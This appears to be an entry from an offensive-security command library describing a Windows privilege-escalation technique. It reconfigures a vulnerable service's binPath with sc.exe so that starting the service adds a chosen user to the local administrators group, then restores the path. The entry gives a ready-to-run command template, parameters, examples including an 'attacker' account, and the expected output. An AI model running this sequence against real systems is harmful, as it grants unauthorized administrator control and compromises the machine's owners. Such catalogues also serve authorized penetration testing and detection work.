---
id: c98db962-c403-4df0-bbae-653a1246e60e
name: sc-config-add-user-to-administrators
type: command
executor: cmd
data: >-
  sc.exe config $SERVICE_NAME binPath= "net localgroup administrators
  $DOMAIN\$USERNAME /add" && sc.exe start $SERVICE_NAME && sc.exe config
  $SERVICE_NAME binPath= "original_path.exe"
output: null
created_at: '2023-01-12T04:55:30.130063+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - privilege-escalation
  - exploitation
verified: true
validated: true
---

# sc-config-add-user-to-administrators

## Command

```cmd
sc.exe config $SERVICE_NAME binPath= "net localgroup administrators $DOMAIN\$USERNAME /add" && sc.exe start $SERVICE_NAME && sc.exe config $SERVICE_NAME binPath= "original_path.exe"
```

## Description

This command sequence uses sc.exe to modify a service's binary path to a payload that adds a user to the local administrators group, starts the service to execute it, and then reverts the path.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $SERVICE_NAME | Name of the vulnerable service | Yes |
| $DOMAIN | Domain or local (e.g., "." for local) | Yes |
| $USERNAME | Username to add to admins | Yes |
| original_path.exe | Original binary path of the service (query with 'sc qc $SERVICE_NAME') | Yes |

## Examples

### Basic Usage

```cmd
sc.exe config VulnService binPath= "net localgroup administrators CONTOSO\attacker /add" && sc.exe start VulnService && sc.exe config VulnService binPath= "C:\Windows\System32\svchost.exe -k netsvcs"
```

### Local Machine

```cmd
sc.exe config TestService binPath= "net localgroup administrators .\localuser /add" && sc.exe start TestService && sc.exe config TestService binPath= "original.exe"
```

## Expected Output

[SC] ChangeServiceConfig SUCCESS
SERVICE_NAME: TestService
        TYPE               : 10  WIN32_OWN_PROCESS
        ...

No failure messages; the service starts without errors, and the user is added.

## Related

- [[procedures/Search-and-Exploit-Service-Abuse-Functions]]
